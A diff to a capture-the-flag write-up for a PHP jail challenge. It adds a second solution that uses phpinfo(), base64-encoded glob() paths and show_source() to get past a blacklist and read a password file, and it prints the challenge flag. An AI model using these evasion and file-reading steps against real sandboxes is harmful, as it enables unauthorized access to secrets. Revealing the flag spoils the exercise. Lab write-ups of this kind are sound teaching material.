@@ -127,3 +127,36 @@ With the source code known and `class` not blacklisted we can hijack jail, with 
 >>> system('cat ./passwd/.passwd')
 G00dJ0b!Th1sI5th3phpAYfl4g
 ```
+
+::: tip Flag
+G00dJ0b!Th1sI5th3phpAYfl4g
+:::
+
+### Solution 2
+
+```php
+>>> echo phpinfo();
+Environment
+...
+HOME => /challenge/app-script/ch13
+...
+SHELL => /challenge/app-script/ch13/ch13.php
+...
+
+>>> print_r(glob(base64_decode(Li8q))); # *
+Array
+(
+    [0] => ./ch13.php
+    [1] => ./passwd
+)
+
+>>> print_r(glob(base64_decode(Li9wYXNzd2QvLio))); # ./passwd/.*
+Array
+(
+    [0] => ./passwd/.
+    [1] => ./passwd/..
+    [2] => ./passwd/.passwd
+)
+
+>>> show_source(base64_decode(L2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoMTMvcGFzc3dkLy5wYXNzd2Q)); # /challenge/app-script/ch13/passwd/.passwd
+```
